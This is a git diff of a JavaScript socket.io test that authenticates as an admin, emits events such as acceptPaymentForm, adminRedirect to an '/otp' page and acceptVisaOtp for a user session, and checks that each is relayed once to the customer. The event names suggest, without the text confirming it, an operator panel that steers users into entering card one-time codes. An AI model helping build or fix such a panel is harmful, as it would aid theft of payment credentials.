@@ -120,22 +120,22 @@ console.log(`\n✓ all ${Object.keys(expected).length} fields flattened onto the
 
 const admin = io(BASE, {
   transports: ["websocket"],
-  auth: ADMIN_TOKEN ? { adminToken: ADMIN_TOKEN } : {},
+  auth: ADMIN_TOKEN ? { token: ADMIN_TOKEN } : {},
   extraHeaders: { Origin: ORIGIN },
 });
 await new Promise((resolve, reject) => {
   const timer = setTimeout(() => reject(new Error("admin socket connection timed out")), 20000);
   admin.once("connect", () => {
     clearTimeout(timer);
-    admin.emit("join", { role: "admin", ...(ADMIN_TOKEN ? { adminToken: ADMIN_TOKEN } : {}) });
+    admin.emit("join", { role: "admin", ...(ADMIN_TOKEN ? { token: ADMIN_TOKEN } : {}) });
     resolve();
   });
   admin.once("connect_error", reject);
 }).catch((e) => fail(e.message));
 
 for (const [event, payload] of [
-  ["acceptPaymentForm", { id: uuid }],
-  ["adminRedirect", { uuid, page: "/otp", pageName: "OTP" }],
+  ["acceptPaymentForm", { sessionId: uuid, token: ADMIN_TOKEN }],
+  ["adminRedirect", { sessionId: uuid, path: "/otp", token: ADMIN_TOKEN }],
   ["acceptVisaOtp", { targetUserId: uuid }],
   ["clientBlocked", { userId: uuid, message: "blocked" }],
 ]) {
@@ -159,6 +159,8 @@ for (const [event, action] of Object.entries(expectedRelay)) {
     (entry) => entry.event === event && (!action || entry.payload?.action === action),
   );
   if (matches.length !== 1) fail(`${event} relay count=${matches.length}, expected 1`);
+  if (event === "admin:redirect" && matches[0]?.payload?.page !== "/otp")
+    fail(`admin:redirect page=${matches[0]?.payload?.page}, expected /otp`);
   console.log(`✓ ${event} relayed once to customer`);
 }
 
